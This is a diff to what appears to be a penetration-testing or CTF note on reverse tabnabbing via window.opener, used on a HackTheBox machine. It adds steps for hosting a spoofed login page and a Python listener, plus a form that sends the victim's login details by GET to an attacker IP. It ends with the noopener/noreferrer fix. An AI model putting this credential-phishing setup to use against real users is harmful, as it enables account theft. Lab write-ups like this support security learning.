@@ -9,7 +9,7 @@ https://hackerone.com/reports/179568
 
 When you open a link in a new tab ( ```target="_blank"``` ), the page that opens in a new tab can access the initial tab and change it's location using the window.opener property. 
 
-## Tab napping setup. 
+## Tab napping (manual) 
 
 You need 2 html forms.
 
@@ -18,7 +18,7 @@ You need 2 html forms.
 
 ## Example (hackthebox machine foothold used to test) (developers htb, hard machine)
 
-1. Spoofed login.html (make sure to update any links so they resolve the content and looks as the original)
+1. Spoofed login.html (make sure to update any links so they resolve the content and looks as the original)(POST chnaged to GET request)
 
 ```
 <!doctype html>
@@ -80,7 +80,19 @@ if (window.parent != window) window.parent.location.replace('//IP:PORT/login.htm
 </html>
 ```
 
+3. Setup two python server's to host your files to be served. 
 
+```
+python3 -m http.server 8088     # to host the files
+python3 -m http.server 8074     # to get the login details
+```
+
+Now you can send your exploit and await the login details. 
+Note I changed the POST to a GET request for ease. 
+
+```
+<form class="form-signin" action="//10.10.14.148:8074" method="get">
+```
 ## Remedy the issue. 
 
 The fix is very simple by adding ```noopenerand noreferrertags``` to the href elements on the page:
